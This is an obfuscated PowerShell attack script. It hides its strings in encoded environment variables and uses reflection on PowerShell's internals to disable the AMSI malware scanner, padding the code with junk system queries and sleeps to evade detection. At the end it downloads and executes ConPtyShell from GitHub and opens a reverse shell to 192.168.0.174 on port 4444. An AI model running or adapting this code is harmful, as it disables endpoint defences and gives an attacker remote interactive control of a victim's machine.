$env:QpVth0yD = "XvFQ8VbxX/FS8VPxXfFW8VXx"
$env:DVyKiTWS = "UvFe8WTxWvE68V/xWvFl8TfxUvFa8V3xVvFV8Q=="
$env:QzX0vi5M = "RPFW8WXxR/FS8V3xZvFW8Q=="
$env:g74n5D0l = "OPFW8WXxRfFq8WHxVvE="
$env:RB6tP1xu = "RPFq8WTxZfFW8V7xH/E+8VLxX/FS8VjxVvFe8VbxX/Fl8R/xMvFm8WXxYPFe8VLxZfFa8WDxX/Ef8UXxY/FS8VTxWvFf8VjxH/FB8UTxNvFl8WjxPfFg8VjxQfFj8WDxZ/Fa8VXxVvFj8Q=="
$env:TrnWN8OQ = "OPFW8WXxN/Fa8VbxXfFV8Q=="
$env:yTXvP4SS = "RPFq8WTxZfFW8V7xH/E+8VLxX/FS8VjxVvFe8VbxX/Fl8R/xMvFm8WXxYPFe8VLxZfFa8WDxX/Ef8TLxXvFk8VrxRvFl8VrxXfFk8Q=="
$env:bfZnYfa0 = "VvFl8WjxQfFj8WDxZ/Fa8VXxVvFj8Q=="
$env:qCKztcpO = "OPFW8WXxR/FS8V3xZvFW8Q=="

function fnzLMYsF($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=($b[$i] - 241 + 256) % 256};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$jma = fnzLMYsF 'g74n5D0l'
$iy8 = fnzLMYsF 'TrnWN8OQ'
$w5w = fnzLMYsF 'QzX0vi5M'
$prq = fnzLMYsF 'qCKztcpO'
$ln6 = [System.Reflection.BindingFlags]((0x72 -bxor 0x52) + (0xDC -bxor 0xD4))
$ogy = [System.Reflection.BindingFlags]((0xCC -bxor 0xEC) + (0x36 -bxor 0x32))

$rvd = [Ref].Assembly

try {
  $null = (Get-WmiObject Win32_Processor).Name
  Start-Sleep -Milliseconds 100
  $null = [Environment]::OSVersion.Version
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName -ErrorAction SilentlyContinue

  try {
    $fio = fnzLMYsF 'RB6tP1xu'
    $cp5 = $rvd.$jma($fio)
    $a58 = fnzLMYsF 'bfZnYfa0'
    $ljk = $cp5.$iy8($a58, $ln6)
    $ma8 = $ljk.$prq($null)
    $gx5 = fnzLMYsF 'QpVth0yD'
    $wpt = $ma8.$jma()
    $ykk = $wpt.$iy8($gx5, $ogy)
    $ykk.$w5w($ma8, 0)
    $j61 = $ykk.$prq($ma8)
    if ($j61 -eq 0) {
      Write-Host '[+] Stage 1 OK'
    } else {
      Write-Host '[!] Stage 1 failed'
    }
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue
  $null = [Environment]::ProcessorCount
  Start-Sleep -Milliseconds 173
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption

  try {
    $pxz = fnzLMYsF 'yTXvP4SS'
    $u3c = $rvd.$jma($pxz)
    $goa = fnzLMYsF 'DVyKiTWS'
    $by6 = [System.DateTime]::Now.Ticks
    $lqg = $u3c.$iy8($goa, $ln6)
    $lqg.$w5w($null, $true)
    $uwk = $lqg.$prq($null)
    if ($uwk -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $zy9 = fnzLMYsF 'yTXvP4SS'
    $gn4 = $rvd.$jma($zy9)
    if ($gn4 -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }
}
finally {
  Remove-Item Env:\g74n5D0l -ErrorAction SilentlyContinue
  Remove-Item Env:\TrnWN8OQ -ErrorAction SilentlyContinue
  Remove-Item Env:\QzX0vi5M -ErrorAction SilentlyContinue
  Remove-Item Env:\qCKztcpO -ErrorAction SilentlyContinue
  Remove-Item Env:\yTXvP4SS -ErrorAction SilentlyContinue
  Remove-Item Env:\DVyKiTWS -ErrorAction SilentlyContinue
  Remove-Item Env:\RB6tP1xu -ErrorAction SilentlyContinue
  Remove-Item Env:\bfZnYfa0 -ErrorAction SilentlyContinue
  Remove-Item Env:\QpVth0yD -ErrorAction SilentlyContinue
}
    # ConPtyShell execution
    try {
        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.174 4444
    } catch {
        Write-Host "[!] ConPtyShell execution failed"
    }
    
